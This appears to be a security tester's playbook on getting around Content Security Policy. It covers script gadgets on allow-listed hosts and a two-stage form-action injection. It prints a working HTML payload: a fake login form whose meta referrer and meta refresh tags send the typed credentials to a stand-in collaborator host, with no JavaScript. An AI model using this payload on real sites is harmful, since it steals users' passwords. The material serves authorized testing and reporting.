---
title: CSP bypass testing, allowlist gadgets, and form-action credential exfil
---

# CSP bypass testing, allowlist gadgets, and form-action credential exfil

Content Security Policy is the safety net that is supposed to keep an HTML injection from becoming XSS. It fails in two operator-replayable ways: the policy allow-lists a host that hosts a script gadget (JSONP callback, legacy AngularJS), or the policy forgets that `form-action` does not inherit from `default-src`, so credentials can be harvested with zero JavaScript. PortSwigger Research formalized both checks in the Nov 11 2026 post [Blind trust: stealing credentials through CSP](https://portswigger.net/research/blind-trust-stealing-credentials-through-csp) (Gareth Heyes), shipped as a Burp AT skill; the method below works the same by hand.

Use this playbook on any authorized target where you have found a reflected or stored HTML-injection sink that is currently priced as "low" because a CSP blocks script execution.

## Boundary 1: Host allow-list gadget lookup

A host allow-list is only as strong as the weakest file on any host in it. If `script-src` allows a domain that serves a JSONP endpoint with a controllable callback, that endpoint loads as a script and runs arbitrary JavaScript from an allowed origin.

Matching rules that decide whether a gadget actually fires:

1. Compute the effective script sources via the browser fallback chain: `script-src-elem`, then `script-src`, then `default-src`. If none are present, scripts are unrestricted.
2. Match hosts the way the browser does: exact match, `*.example.com` wildcard covering subdomains, bare `*` or scheme-only sources like `https:` allowing any host.
3. Intersect multiple enforced policies. When a response sends more than one `Content-Security-Policy` header the browser must satisfy all of them, so a gadget only counts if every policy allows its domain.
4. Treat `Content-Security-Policy-Report-Only` as blocking nothing. Still analyze it (it leaks the intended policy), but mark findings informational.
5. Check caveats that flip the answer:
   - `strict-dynamic`: modern browsers ignore the host allow-list entirely, so host gadgets will not fire (and nonces/hash-gated execution gates you out too).
   - A nonce or hash may gate execution even when hosts are allowed.
   - `unsafe-inline` present without any nonce, hash, or `strict-dynamic` means you never needed a gadget in the first place.

Gadget corpus: cspbypass.com ships a dataset of 350+ known bypass gadgets (domain plus working snippet). Load it against your effective-source list instead of relying on memorized domains.

Operator rules:

- Enumerate the effective sources FIRST, then match; a gadget against a source that the fallback chain never actually activates is a false positive.
- A policy with scheme-wide sources (`https:`) or wildcard subdomains should be swept for JSONP endpoints on every allowed host, not just the obvious CDN.

## Boundary 2: form-action self-posting credential exfil (no JavaScript)

`form-action` does NOT fall back to `default-src`. If the policy omits `form-action`, forms submit anywhere. If it sets `form-action 'self'`, forms can still submit to the page itself, and that alone is enough to steal credentials when you have an HTML-injection sink.

The two-stage shape (from the PortSwigger post):

```html
?targetParam=<form>
<p><label>Username:</label><br><input name=username></p>
<p><label>Password:</label><br><input type=password name=password></p>
<textarea name=targetParam><meta name=referrer content=unsafe-url><meta http-equiv=refresh content="5;url=https://COLLABORATOR"></textarea>
<input type=submit value=submit>
</form>
```

Why CSP does not stop this:

1. The injected form has no `action`, so it GET-submits back to the same page; `form-action 'self'` permits it.
2. The `<textarea>` is named after the vulnerable parameter, so on submit the username, password, and second-stage payload all land in the query string and the page re-reflects the payload as real HTML.
3. `<meta name=referrer content=unsafe-url>` forces the full URL (credentials included) into the `Referer` header.
4. `<meta http-equiv=refresh>` navigates to your collaborator. Navigations are outside CSP's enforcement. No script ever runs.

Proof endpoint: `https://portswigger-labs.net/csp-form-action-test/?x=123` serves `default-src 'none'; form-action 'self'; style-src 'nonce-...'` and still falls to this chain. The delay on the refresh exists so you can watch the flow before the redirect; keep it in PoCs so reviewers see causality.

Validation boundaries: collect only test credentials you supply through owned accounts. The sink plus a collaborator `Referer` interaction is the proof; do not harvest real users.

## Triage checklist when a CSP blocks your XSS

- [ ] Dump every CSP header on the response (enforced AND report-only) and any `<meta http-equiv="Content-Security-Policy">`.
- [ ] Resolve effective `script-src*` per policy via the fallback chain; intersect across multiple enforced headers.
- [ ] Grep the allowed hosts against the cspbypass.com gadget corpus (JSONP callbacks, legacy AngularJS).
- [ ] Check for `unsafe-inline` without nonce/hash/`strict-dynamic` (instant win, no gadget needed).
- [ ] Check `form-action` independently: absent = submit anywhere, `'self'` = self-posting two-stage form is viable.
- [ ] Check `base-uri`, `object-src`, and `navigate-to`-adjacent gaps only after the two primary vectors; do not stop at "script blocked".
- [ ] Price the finding by the working vector: a `default-src 'none'` policy is NOT a mitigating control if form-action exfil works; report it as credential capture, not as "HTML injection behind CSP".

## Reporting heuristic

State the policy string, the exact directive that permitted the vector, the stage-1 injection, the stage-2 reflected render, and the collaborator `Referer` interaction showing the credentials. If a script gadget also matched, present form-action as an ADDITIONAL vector so the finding does not die when one gadget is patched out of the allow-list.
